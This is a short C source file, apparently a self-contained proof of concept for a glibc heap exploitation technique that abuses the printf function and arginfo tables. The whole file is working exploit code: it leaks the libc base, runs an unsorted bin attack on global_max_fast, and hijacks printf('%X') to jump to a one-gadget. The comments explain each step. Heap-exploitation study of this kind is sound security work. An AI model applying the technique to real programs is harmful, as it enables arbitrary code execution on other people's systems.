// https://ptr-yudai.hatenablog.com/entry/2020/04/02/013910
// https://maxwelldulin.com/BlogPost?post=3107454976


#include <stdio.h>
#include <stdlib.h>


#define CHUNK_SIZE(delta) \
    ((unsigned long)((delta) * 2 + 0x20))


#define MALLOC_SIZE(delta) \
    ((unsigned long)(CHUNK_SIZE(delta)) - 0x8)


unsigned long offset_gmf = 0x3ed940;
unsigned long offset_main_arena = 0x3ebc40;
unsigned long offset_unsorted_bins_chunk = 0x3ebca0;
unsigned long offset_fastbinsY = 0x3ebc50;
unsigned long offset_printf_functable = 0x3f0658;
unsigned long offset_printf_argtable = 0x3ec870;
unsigned long offset_one_gadget = 0x10a38c;


int main(void) {
    unsigned long *uba, *printf_ft_chunk, *printf_at_chunk, *pc;

    setbuf(stdout, NULL);

    uba = malloc(0x418);
    printf_ft_chunk = malloc(MALLOC_SIZE(offset_printf_functable - offset_fastbinsY));
    printf_at_chunk = malloc(MALLOC_SIZE(offset_printf_argtable - offset_fastbinsY));
    pc = malloc(0x418); // prevent consolidation

    free(uba);

    unsigned long addr_libc = *uba - offset_unsorted_bins_chunk;
    printf("addr_libc: 0x%lx\n", addr_libc);

    // Carry out unsorted bin attack and overwrite global_max_fast
    uba[1] = addr_libc + offset_gmf - 0x10;
    malloc(0x418);

    // Overwrite __printf_function_table to
    // non NULL value with primitive 1 of house of corrosion.
    free(printf_ft_chunk);
    // Register one gadget to function pointer which corresponds to "%X"
    // __printf_arginfo_table is a simple array of function pointers.
    // The 0th element corresponds to "%a", the 1st element corresponds to "%b" and so on.
    // Here we register "%X" to call one gadget, so we want:
    // `__printf_arginfo_table['X'] = addr_one_gadget`.
    // Since after `free(print_at_chunk)`, `__printf_arginfo_table = print_at_chunk - 0x2`,
    // (print_at_chunk is treated as fast bins so address of prev_size will be pointed to.
    // so don't forget to subtract 2 from 'X'.
    // Use primitive 1 from house of corrosion.
    printf_at_chunk['X' - 2] = addr_libc + offset_one_gadget;
    free(printf_at_chunk);

    // Trigger
    printf("%X");

    return 0;
}
